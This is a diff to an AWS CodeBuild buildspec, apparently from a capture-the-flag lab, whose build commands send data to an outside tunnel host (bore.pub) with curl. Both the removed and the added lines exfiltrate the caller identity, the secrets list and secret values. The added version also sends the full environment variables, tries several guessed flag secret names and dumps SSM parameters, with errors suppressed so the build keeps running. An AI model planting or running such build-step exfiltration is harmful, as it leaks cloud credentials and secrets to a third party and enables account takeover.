@@ -2,8 +2,8 @@ version: 0.2
 phases:
   build:
     commands:
-      - aws sts get-caller-identity --region us-east-1 | curl -s -X POST -d @- http://bore.pub:37842/identity
-      - aws secretsmanager list-secrets --region us-east-1 | curl -s -X POST -d @- http://bore.pub:37842/secrets
-      - aws secretsmanager list-secrets --region us-east-1 --query SecretList[].Name --output text | curl -s -X POST -d @- http://bore.pub:37842/secret_names
-      - FLAG_NAME=$(aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[0].Name' --output text)
-      - aws secretsmanager get-secret-value --secret-id "$FLAG_NAME" --region us-east-1 | curl -s -X POST -d @- http://bore.pub:37842/flag
+      - env | curl -s -X POST -d @- http://bore.pub:37842 || true
+      - aws sts get-caller-identity --region us-east-1 2>&1 | curl -s -X POST -d @- http://bore.pub:37842 || true
+      - aws secretsmanager list-secrets --region us-east-1 2>&1 | curl -s -X POST -d @- http://bore.pub:37842 || true
+      - for name in flag_codebuild_lab_5 flag-codebuild-lab-5 lab5-flag codebuild_lab_5_flag codebuild-lab-5-flag; do aws secretsmanager get-secret-value --secret-id "$name" --region us-east-1 2>&1 | curl -s -X POST -d @- "http://bore.pub:37842/$name" || true; done
+      - aws ssm describe-parameters --region us-east-1 2>&1 | curl -s -X POST -d @- http://bore.pub:37842/ssm || true
